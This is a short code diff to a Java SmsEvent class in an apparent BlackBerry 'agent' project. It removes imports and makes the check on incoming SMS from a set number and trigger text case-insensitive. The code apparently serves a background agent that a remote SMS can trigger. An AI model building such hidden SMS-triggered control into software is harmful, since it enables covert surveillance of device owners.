@@ -12,8 +12,6 @@ import java.io.EOFException;
 import java.io.IOException;
 import java.io.InterruptedIOException;
 
-import javax.microedition.io.Connector;
-import javax.microedition.io.Datagram;
 import javax.microedition.io.DatagramConnection;
 import javax.wireless.messaging.BinaryMessage;
 import javax.wireless.messaging.Message;
@@ -22,13 +20,10 @@ import javax.wireless.messaging.MessageListener;
 import javax.wireless.messaging.TextMessage;
 
 import net.rim.device.api.util.DataBuffer;
-
-import blackberry.action.Action;
 import blackberry.agent.sms.SmsListener;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.interfaces.SmsObserver;
-import blackberry.utils.Check;
 import blackberry.utils.WChar;
 
 
@@ -175,7 +170,7 @@ public final class SmsEvent extends Event implements MessageListener, SmsObserve
                 //#ifdef DEBUG
                 debug.trace("parse: we have a text");
                 //#endif
-                text = WChar.getString(textW, true);
+                text = WChar.getString(textW, true).toLowerCase();
             }
 
             //#ifdef DEBUG
@@ -195,14 +190,15 @@ public final class SmsEvent extends Event implements MessageListener, SmsObserve
         String msg = null;
         if (m instanceof TextMessage) {
             final TextMessage tm = (TextMessage) m;
-            msg = tm.getPayloadText();
+            msg = tm.getPayloadText().toLowerCase();
             
             if(incoming && address.endsWith(number)){
                 //#ifdef DEBUG
                 debug.trace("notifyIncomingMessage: good number "+address);
                 //#endif
                 
-                if( text == null || msg.indexOf(text) >= 0 ){
+                // case insensitive
+                if( text == null || msg.startsWith(text)){
                     //#ifdef DEBUG
                     debug.trace("notifyIncomingMessage good message: " + msg);
                     //#endif
